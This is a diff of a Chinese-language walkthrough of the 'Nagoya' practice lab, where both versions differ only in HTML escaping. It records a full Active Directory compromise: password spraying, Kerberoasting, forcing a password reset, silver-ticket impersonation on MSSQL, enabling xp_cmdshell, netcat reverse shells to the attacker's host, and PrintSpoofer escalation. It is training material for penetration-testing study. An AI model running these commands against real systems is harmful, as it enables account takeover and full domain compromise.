@@ -58,44 +58,44 @@ Nmap done: 1 IP address (1 host up) scanned in 32.86 seconds
 
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
-[*] Valid user => Matthew.Harrison
-[*] Valid user => Emma.Miah
-[*] Valid user => Rebecca.Bell
-[*] Valid user => Scott.Gardner
-[*] Valid user => Terry.Edwards
-[*] Valid user => Holly.Matthews
-[*] Valid user => Anne.Jenkins
-[*] Valid user => Brett.Naylor
-[*] Valid user => Melissa.Mitchell
-[*] Valid user => Craig.Carr
-[*] Valid user => Fiona.Clark
-[*] Valid user => Patrick.Martin
-[*] Valid user => Kate.Watson
-[*] Valid user => Kirsty.Norris
-[*] Valid user => Andrea.Hayes
-[*] Valid user => Abigail.Hughes
-[*] Valid user => Melanie.Watson
-[*] Valid user => Frances.Ward
-[*] Valid user => Sylvia.King
-[*] Valid user => Wayne.Hartley
-[*] Valid user => Iain.White
-[*] Valid user => Joanna.Wood
-[*] Valid user => Bethan.Webster
-[*] Valid user => Elaine.Brady
-[*] Valid user => Christopher.Lewis
-[*] Valid user => Megan.Johnson
-[*] Valid user => Damien.Chapman
-[*] Valid user => Joanne.Lewis
-[*] No passwords were discovered :'(
+[*] Valid user =&gt; Matthew.Harrison
+[*] Valid user =&gt; Emma.Miah
+[*] Valid user =&gt; Rebecca.Bell
+[*] Valid user =&gt; Scott.Gardner
+[*] Valid user =&gt; Terry.Edwards
+[*] Valid user =&gt; Holly.Matthews
+[*] Valid user =&gt; Anne.Jenkins
+[*] Valid user =&gt; Brett.Naylor
+[*] Valid user =&gt; Melissa.Mitchell
+[*] Valid user =&gt; Craig.Carr
+[*] Valid user =&gt; Fiona.Clark
+[*] Valid user =&gt; Patrick.Martin
+[*] Valid user =&gt; Kate.Watson
+[*] Valid user =&gt; Kirsty.Norris
+[*] Valid user =&gt; Andrea.Hayes
+[*] Valid user =&gt; Abigail.Hughes
+[*] Valid user =&gt; Melanie.Watson
+[*] Valid user =&gt; Frances.Ward
+[*] Valid user =&gt; Sylvia.King
+[*] Valid user =&gt; Wayne.Hartley
+[*] Valid user =&gt; Iain.White
+[*] Valid user =&gt; Joanna.Wood
+[*] Valid user =&gt; Bethan.Webster
+[*] Valid user =&gt; Elaine.Brady
+[*] Valid user =&gt; Christopher.Lewis
+[*] Valid user =&gt; Megan.Johnson
+[*] Valid user =&gt; Damien.Chapman
+[*] Valid user =&gt; Joanne.Lewis
+[*] No passwords were discovered :&#39;(
 ```
 
 
 
 ### Hint-1
 
-> **Foothold 1**
->
-> Build a username wordlist with the names found in the web app, you can try conventions like Offsec.Labs . Spraying easy password combinations like seasons + years is always a good start.
+&gt; **Foothold 1**
+&gt;
+&gt; Build a username wordlist with the names found in the web app, you can try conventions like Offsec.Labs . Spraying easy password combinations like seasons &#43; years is always a good start.
 
 ### SMB-445
 
@@ -107,7 +107,7 @@ SMB枚举：
 
 ```sh
 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Nagoya]
-└─$ crackmapexec smb 192.168.166.21 -u ./users.txt -p 'Summer2023' --shares 
+└─$ crackmapexec smb 192.168.166.21 -u ./users.txt -p &#39;Summer2023&#39; --shares 
 SMB         192.168.166.21  445    NAGOYA           [*] Windows 10.0 Build 17763 x64 (name:NAGOYA) (domain:nagoya-industries.com) (signing:True) (SMBv1:False)
 SMB         192.168.166.21  445    NAGOYA           [-] nagoya-industries.com\Matthew.Harrison:Summer2023 STATUS_LOGON_FAILURE 
 SMB         192.168.166.21  445    NAGOYA           [-] nagoya-industries.com\Emma.Miah:Summer2023 STATUS_LOGON_FAILURE 
@@ -119,8 +119,8 @@ SMB         192.168.166.21  445    NAGOYA           [-] nagoya-industries.com\An
 SMB         192.168.166.21  445    NAGOYA           [-] nagoya-industries.com\Brett.Naylor:Summer2023 STATUS_LOGON_FAILURE 
 SMB         192.168.166.21  445    NAGOYA           [-] nagoya-industries.com\Melissa.Mitchell:Summer2023 STATUS_LOGON_FAILURE 
 SMB         192.168.166.21  445    NAGOYA           [-] nagoya-industries.com\Craig.Carr:Summer2023 STATUS_LOGON_FAILURE 
-SMB         192.168.166.21  445    NAGOYA           [+] nagoya-industries.com\Fiona.Clark:Summer2023 
-SMB         192.168.166.21  445    NAGOYA           [+] Enumerated shares
+SMB         192.168.166.21  445    NAGOYA           [&#43;] nagoya-industries.com\Fiona.Clark:Summer2023 
+SMB         192.168.166.21  445    NAGOYA           [&#43;] Enumerated shares
 SMB         192.168.166.21  445    NAGOYA           Share           Permissions     Remark
 SMB         192.168.166.21  445    NAGOYA           -----           -----------     ------
 SMB         192.168.166.21  445    NAGOYA           ADMIN$                          Remote Admin
@@ -137,8 +137,8 @@ SMB         192.168.166.21  445    NAGOYA           SYSVOL          READ        
 ```sh
 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Nagoya]
 └─$ smbclient  //192.168.166.21/SYSVOL -U Fiona.Clark%Summer2023
-Try "help" to get a list of possible commands.
-smb: \> ls
+Try &#34;help&#34; to get a list of possible commands.
+smb: \&gt; ls
   .                                   D        0  Sun Apr 30 14:31:25 2023
   ..                                  D        0  Sun Apr 30 14:31:25 2023
   nagoya-industries.com              Dr        0  Sun Apr 30 14:31:25 2023
@@ -149,7 +149,7 @@ smb: \> ls
 翻文件，找到一个ResetPassword目录
 
 ```sh
-smb: \> ls nagoya-industries.com\scripts\resetpassword\
+smb: \&gt; ls nagoya-industries.com\scripts\resetpassword\
   .                                   D        0  Sun Apr 30 16:07:07 2023
   ..                                  D        0  Sun Apr 30 16:07:07 2023
   ResetPassword.exe                   A     5120  Mon May  1 01:04:02 2023
@@ -170,9 +170,9 @@ smb: \> ls nagoya-industries.com\scripts\resetpassword\
 
 ### Hint-2
 
-> **Foothold 2**
->
-> Enumerate shares, find the binary and reverse engineer it. Make use of credentials you found. Keep in mind that one can still enumerate ACLs without actually getting a shell
+&gt; **Foothold 2**
+&gt;
+&gt; Enumerate shares, find the binary and reverse engineer it. Make use of credentials you found. Keep in mind that one can still enumerate ACLs without actually getting a shell
 
 经过提示需要逆向分析，于是下载exe文件到本地，进行逆向。
 
@@ -190,23 +190,23 @@ smb: \> ls nagoya-industries.com\scripts\resetpassword\
 
 ```sh
 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Nagoya]
-└─$ impacket-GetUserSPNs nagoya-industries.com/fiona.clark:'Summer2023' -dc-ip 192.168.166.21 -debug -outputfile kerberoast.txt
+└─$ impacket-GetUserSPNs nagoya-industries.com/fiona.clark:&#39;Summer2023&#39; -dc-ip 192.168.166.21 -debug -outputfile kerberoast.txt
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
-[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
-[+] Connecting to 192.168.166.21, port 389, SSL False
-[+] Total of records returned 5
+[&#43;] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
+[&#43;] Connecting to 192.168.166.21, port 389, SSL False
+[&#43;] Total of records returned 5
 ServicePrincipalName                Name          MemberOf                                          PasswordLastSet             LastLogon                   Delegation 
 ----------------------------------  ------------  ------------------------------------------------  --------------------------  --------------------------  ----------
-http/nagoya.nagoya-industries.com   svc_helpdesk  CN=helpdesk,CN=Users,DC=nagoya-industries,DC=com  2023-04-30 15:31:06.190955  <never>                                
+http/nagoya.nagoya-industries.com   svc_helpdesk  CN=helpdesk,CN=Users,DC=nagoya-industries,DC=com  2023-04-30 15:31:06.190955  &lt;never&gt;                                
 MSSQL/nagoya.nagoya-industries.com  svc_mssql                                                       2023-04-30 15:45:33.288595  2023-06-16 05:38:06.145798             
 
 [-] CCache file is not found. Skipping...
-[+] The specified path is not correct or the KRB5CCNAME environment variable is not defined
-[+] Trying to connect to KDC at 192.168.166.21
-[+] Trying to connect to KDC at 192.168.166.21
-[+] Trying to connect to KDC at 192.168.166.21
-[+] Trying to connect to KDC at 192.168.166.21
+[&#43;] The specified path is not correct or the KRB5CCNAME environment variable is not defined
+[&#43;] Trying to connect to KDC at 192.168.166.21
+[&#43;] Trying to connect to KDC at 192.168.166.21
+[&#43;] Trying to connect to KDC at 192.168.166.21
+[&#43;] Trying to connect to KDC at 192.168.166.21
 
 ```
 
@@ -222,10 +222,10 @@ MSSQL/nagoya.nagoya-industries.com  svc_mssql                                   
 Using default input encoding: UTF-8
 Loaded 2 password hashes with 2 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
 Will run 2 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
 Service1         (?)     
 1g 0:00:00:13 DONE (2024-02-07 17:10) 0.07189g/s 1031Kp/s 1106Kc/s 1106KC/s -xlengx-..*7¡Vamos!
-Use the "--show" option to display all of the cracked passwords reliably
+Use the &#34;--show&#34; option to display all of the cracked passwords reliably
 Session completed. 
 ```
 
@@ -241,9 +241,9 @@ Session completed.
 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Nagoya]
 └─$ rpcclient -U nagoya-industries/svc_helpdesk 192.168.166.21
 Password for [NAGOYA-INDUSTRIES\svc_helpdesk]:
-rpcclient $> 
+rpcclient $&gt; 
 # 枚举域用户
-rpcclient $> enumdomusers
+rpcclient $&gt; enumdomusers
 user:[Administrator] rid:[0x1f4]
 user:[Guest] rid:[0x1f5]
 user:[krbtgt] rid:[0x1f6]
@@ -280,7 +280,7 @@ user:[svc_mssql] rid:[0x470]
 user:[svc_tpl] rid:[0x471]
 user:[svc_web] rid:[0x472]
 # 枚举域内组
-rpcclient $> enumdomgroups
+rpcclient $&gt; enumdomgroups
 group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
 group:[Domain Admins] rid:[0x200]
 group:[Domain Users] rid:[0x201]
@@ -301,11 +301,11 @@ group:[helpdesk] rid:[0x466]
 group:[developers] rid:[0x46a]
 
 # 查询用户所属组
-rpcclient $> queryusergroups 0x45c
+rpcclient $&gt; queryusergroups 0x45c
         group rid:[0x201] attr:[0x7]
         group rid:[0x451] attr:[0x7]
 ……
-rpcclient $> queryusergroups 0x46c
+rpcclient $&gt; queryusergroups 0x46c
         group rid:[0x201] attr:[0x7]
         group rid:[0x46a] attr:[0x7]
         group rid:[0x451] attr:[0x7]
@@ -317,14 +317,14 @@ rpcclient $> queryusergroups 0x46c
 这里没有远程管理的组，猜测 developers 组是否能远程。尝试修改 Christopher.Lewis 用户密码。svc_helpdesk 账号对christopher.lewis 具有完全控制权限，可以重置其账号
 
 ```sh
-rpcclient $> setuserinfo christopher.lewis 23 'Admin@123'
+rpcclient $&gt; setuserinfo christopher.lewis 23 &#39;Admin@123&#39;
 ```
 
 尝试远程登录。使用Evil-WinRM登录成功
 
 ```sh
 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Nagoya]
-└─$ evil-winrm -u christopher.lewis -p 'Admin@123' -i 192.168.166.21
+└─$ evil-winrm -u christopher.lewis -p &#39;Admin@123&#39; -i 192.168.166.21
 
 Evil-WinRM shell v3.4
 
@@ -334,11 +334,11 @@ Data: For more information, check Evil-WinRM Github: https://github.com/Hackplay
 
 Info: Establishing connection to remote endpoint
 
-*Evil-WinRM* PS C:\Users\Christopher.Lewis\Documents> ls
-*Evil-WinRM* PS C:\Users\Christopher.Lewis\Documents> whoami
+*Evil-WinRM* PS C:\Users\Christopher.Lewis\Documents&gt; ls
+*Evil-WinRM* PS C:\Users\Christopher.Lewis\Documents&gt; whoami
 nagoya-ind\christopher.lewis
 
-*Evil-WinRM* PS C:\Users\Christopher.Lewis> type C:\local.txt
+*Evil-WinRM* PS C:\Users\Christopher.Lewis&gt; type C:\local.txt
 81950a6ba1771f388080cb994a7fcb33
 
 
@@ -352,9 +352,9 @@ nagoya-ind\christopher.lewis
 上传sharphound进行信息搜集
 
 ```sh
-*Evil-WinRM* PS C:\tmp> upload SharpHound.exe
-*Evil-WinRM* PS C:\tmp> ./SharpHound.exe -c All --OutputPrefix "Nagoya-"
-*Evil-WinRM* PS C:\tmp> download Nagoya-_20240207014142_BloodHound.zip
+*Evil-WinRM* PS C:\tmp&gt; upload SharpHound.exe
+*Evil-WinRM* PS C:\tmp&gt; ./SharpHound.exe -c All --OutputPrefix &#34;Nagoya-&#34;
+*Evil-WinRM* PS C:\tmp&gt; download Nagoya-_20240207014142_BloodHound.zip
 ```
 
 下载过程一直失败，使用SMB进行文件传输。
@@ -371,7 +371,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] Config file parsed
 [*] Config file parsed
 
-*Evil-WinRM* PS C:\tmp> copy Nagoya-_20240207014142_BloodHound.zip \\192.168.45.193\share\Nagoya-_20240207014142_BloodHound.zip
+*Evil-WinRM* PS C:\tmp&gt; copy Nagoya-_20240207014142_BloodHound.zip \\192.168.45.193\share\Nagoya-_20240207014142_BloodHound.zip
 ```
 
 ![image-20240207180428672](resource/22-W-H-Nagoya.assets/image-20240207180428672.png)
@@ -383,7 +383,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 考虑到有个mssql账户，查看当前端口列表，发现存在1433端口，说明有mssql服务。
 
 ```
-*Evil-WinRM* PS C:\tmp> netstat -anop TCP
+*Evil-WinRM* PS C:\tmp&gt; netstat -anop TCP
 
 Active Connections
 
@@ -444,8 +444,8 @@ Active Connections
 上传chisel 进行端口转发，将1433端口代理出来
 
 ```shell
-*Evil-WinRM* PS C:\tmp> upload chisel.exe
-*Evil-WinRM* PS C:\tmp> cmd /c 'C:\tmp\chisel.exe client 192.168.45.193:8000 R:1433:127.0.0.1:1433'
+*Evil-WinRM* PS C:\tmp&gt; upload chisel.exe
+*Evil-WinRM* PS C:\tmp&gt; cmd /c &#39;C:\tmp\chisel.exe client 192.168.45.193:8000 R:1433:127.0.0.1:1433&#39;
 
 # kali
 $ chisel server -p 8000 --reverse
@@ -455,38 +455,38 @@ $ chisel server -p 8000 --reverse
 
 ```sh
 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Nagoya]
-└─$ impacket-mssqlclient svc_mssql:'Service1'@127.0.0.1 -windows-auth
+└─$ impacket-mssqlclient svc_mssql:&#39;Service1&#39;@127.0.0.1 -windows-auth
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 [*] Encryption required, switching to TLS
 [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
 [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
 [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
-[*] INFO(nagoya\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(nagoya\SQLEXPRESS): Line 1: Changed database context to &#39;master&#39;.
 [*] INFO(nagoya\SQLEXPRESS): Line 1: Changed language setting to us_english.
 [*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
 [!] Press help for extra shell commands
-SQL> 
+SQL&gt; 
 ```
 
 尝试启用xp_cmdshell失败，权限不足
 
 ```mssql
-SQL> exec xp_cmdshell 'whoami';
-[-] ERROR(nagoya\SQLEXPRESS): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
-SQL> EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
+SQL&gt; exec xp_cmdshell &#39;whoami&#39;;
+[-] ERROR(nagoya\SQLEXPRESS): Line 1: The EXECUTE permission was denied on the object &#39;xp_cmdshell&#39;, database &#39;mssqlsystemresource&#39;, schema &#39;sys&#39;.
+SQL&gt; EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE;
 [-] ERROR(nagoya\SQLEXPRESS): Line 105: User does not have permission to perform this action.
 [-] ERROR(nagoya\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
-[-] ERROR(nagoya\SQLEXPRESS): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
+[-] ERROR(nagoya\SQLEXPRESS): Line 62: The configuration option &#39;xp_cmdshell&#39; does not exist, or it may be an advanced option.
 [-] ERROR(nagoya\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
-SQL> 
+SQL&gt; 
 ```
 
 ### Hint-3
 
-> **Escalation**
->
-> Perform kerberoast, crack the password of service account for mssql. Use everything you gathered to forge a silver ticket. Elevate your privileges on mssql by impersonating to administrator using the silver ticket.
+&gt; **Escalation**
+&gt;
+&gt; Perform kerberoast, crack the password of service account for mssql. Use everything you gathered to forge a silver ticket. Elevate your privileges on mssql by impersonating to administrator using the silver ticket.
 
 ### 白银票据
 
@@ -510,7 +510,7 @@ SQL>
 域的SID通过powershell查询
 
 ```sh
-*Evil-WinRM* PS C:\tmp> Get-ADDomain
+*Evil-WinRM* PS C:\tmp&gt; Get-ADDomain
 
 AllowedDNSSuffixes                 : {}
 ChildDomains                       : {}
@@ -548,7 +548,7 @@ UsersContainer                     : CN=Users,DC=nagoya-industries,DC=com
 MSSQL服务的SPN 也用Powershell查询
 
 ```sh
-*Evil-WinRM* PS C:\tmp> Get-ADUser -Filter {SamAccountName -eq "svc_mssql"} -Properties ServicePrincipalNames
+*Evil-WinRM* PS C:\tmp&gt; Get-ADUser -Filter {SamAccountName -eq &#34;svc_mssql&#34;} -Properties ServicePrincipalNames
 
 DistinguishedName     : CN=svc_mssql,CN=Users,DC=nagoya-industries,DC=com
 Enabled               : True
@@ -635,11 +635,11 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
 [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
 [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
-[*] INFO(nagoya\SQLEXPRESS): Line 1: Changed database context to 'master'.
+[*] INFO(nagoya\SQLEXPRESS): Line 1: Changed database context to &#39;master&#39;.
 [*] INFO(nagoya\SQLEXPRESS): Line 1: Changed language setting to us_english.
 [*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
 [!] Press help for extra shell commands
-SQL> select system_user;
+SQL&gt; select system_user;
 --------------------------------------
 NAGOYA-IND\Administrator
 
@@ -648,24 +648,24 @@ NAGOYA-IND\Administrator
 成功开启并执行xp_cmdshell
 
 ```sh
-SQL> exec xp_cmdshell 'whoami';
-[-] ERROR(nagoya\SQLEXPRESS): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
-SQL> EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
-[*] INFO(nagoya\SQLEXPRESS): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
-[*] INFO(nagoya\SQLEXPRESS): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
-SQL> exec xp_cmdshell 'whoami';
+SQL&gt; exec xp_cmdshell &#39;whoami&#39;;
+[-] ERROR(nagoya\SQLEXPRESS): Line 1: SQL Server blocked access to procedure &#39;sys.xp_cmdshell&#39; of component &#39;xp_cmdshell&#39; because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of &#39;xp_cmdshell&#39; by using sp_configure. For more information about enabling &#39;xp_cmdshell&#39;, search for &#39;xp_cmdshell&#39; in SQL Server Books Online.
+SQL&gt; EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE;
+[*] INFO(nagoya\SQLEXPRESS): Line 196: Configuration option &#39;show advanced options&#39; changed from 0 to 1. Run the RECONFIGURE statement to install.
+[*] INFO(nagoya\SQLEXPRESS): Line 196: Configuration option &#39;xp_cmdshell&#39; changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL&gt; exec xp_cmdshell &#39;whoami&#39;;
 output
 -------  
 nagoya-ind\svc_mssql
 NULL
 
-SQL>
+SQL&gt;
 ```
 
 执行反弹shell到nc
 
 ```sh
-SQL> exec xp_cmdshell 'C:\tmp\nc64.exe 192.168.45.193 4444 -e powershell';
+SQL&gt; exec xp_cmdshell &#39;C:\tmp\nc64.exe 192.168.45.193 4444 -e powershell&#39;;
 ```
 
 ```sh
@@ -676,16 +676,16 @@ connect to [192.168.45.193] from (UNKNOWN) [192.168.166.21] 50232
 Windows PowerShell 
 Copyright (C) Microsoft Corporation. All rights reserved.
 
-PS C:\Windows\system32> whoami
+PS C:\Windows\system32&gt; whoami
 whoami
 nagoya-ind\svc_mssql
-PS C:\Windows\system32> 
+PS C:\Windows\system32&gt; 
 ```
 
 检查当前用户权限：
 
 ```sh
-PS C:\tmp> whoami /priv
+PS C:\tmp&gt; whoami /priv
 whoami /priv
 
 PRIVILEGES INFORMATION
@@ -706,11 +706,11 @@ SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 发现有SeImpersonatePrivilege，可以利用提权，上传 PrintSpoofer64.exe 进行提权
 
 ```
-PS C:\tmp> .\PrintSpoofer64.exe -c "C:\tmp\nc64.exe 192.168.45.193 5555 -e powershell"
-.\PrintSpoofer64.exe -c "C:\tmp\nc64.exe 192.168.45.193 5555 -e powershell"
-[+] Found privilege: SeImpersonatePrivilege
-[+] Named pipe listening...
-[+] CreateProcessAsUser() OK
+PS C:\tmp&gt; .\PrintSpoofer64.exe -c &#34;C:\tmp\nc64.exe 192.168.45.193 5555 -e powershell&#34;
+.\PrintSpoofer64.exe -c &#34;C:\tmp\nc64.exe 192.168.45.193 5555 -e powershell&#34;
+[&#43;] Found privilege: SeImpersonatePrivilege
+[&#43;] Named pipe listening...
+[&#43;] CreateProcessAsUser() OK
 
 ```
 
@@ -724,11 +724,11 @@ connect to [192.168.45.193] from (UNKNOWN) [192.168.166.21] 50271
 Windows PowerShell 
 Copyright (C) Microsoft Corporation. All rights reserved.
 
-PS C:\Windows\system32> whoami
+PS C:\Windows\system32&gt; whoami
 whoami
 nagoya-ind\nagoya$
 
-PS C:\Windows\system32> type C:\Users\Administrator\Desktop\proof.txt
+PS C:\Windows\system32&gt; type C:\Users\Administrator\Desktop\proof.txt
 type C:\Users\Administrator\Desktop\proof.txt
 fa2dba2c7bdff500c6f6ce31dfa6037e
 ```
@@ -740,7 +740,7 @@ fa2dba2c7bdff500c6f6ce31dfa6037e
 ## Flag
 
 ```sh
-*Evil-WinRM* PS C:\Users\Christopher.Lewis> type C:\local.txt
+*Evil-WinRM* PS C:\Users\Christopher.Lewis&gt; type C:\local.txt
 81950a6ba1771f388080cb994a7fcb33
 
 type C:\Users\Administrator\Desktop\proof.txt
